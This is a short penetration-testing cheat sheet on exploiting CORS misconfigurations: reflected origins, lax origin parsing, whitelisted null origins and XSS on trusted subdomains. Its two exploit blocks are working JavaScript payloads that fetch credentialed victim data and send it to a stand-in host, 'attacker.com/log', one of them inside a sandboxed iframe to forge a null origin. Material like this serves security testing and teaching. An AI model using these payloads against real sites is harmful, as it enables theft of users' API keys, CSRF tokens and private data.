# CORS

**Impact**: if a response contains any sensitive information such as an API key or CSRF token, you could retrieve these info.

## <mark style="color:purple;">Server ACAO Header from Client-Origin</mark>

Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.

**Detection**&#x20;

Send request with `Origin: https://example.com` and see if the origin is reflected in the `Access-Control-Allow-Origin` header.

**Exploit**

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://attacker.com/log?key='+this.responseText;
};
</script>
```

## <mark style="color:purple;">**Errors parsing Origin headers**</mark>

Suppose `normal-website.com`. Bypass with`hackersnormal-website.com` or `normal-website.com.evil-user.net`

{% hint style="info" %}
**Note**: you need to know the whitelisted origins.
{% endhint %}

## <mark style="color:purple;">**Whitelisted null origin value**</mark>

**Detection**

Send request with `Origin: null` and see if the response has `Access-Control-Allow-Origin: null`

**Exploit**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://attacker.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## <mark style="color:purple;">Exploiting XSS via CORS trust relationships</mark> <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>

Suppose that:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

If you find an XSS on `subdomain.vulnerable-website.com` inject JavaScript that uses CORS and retrieve information.

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
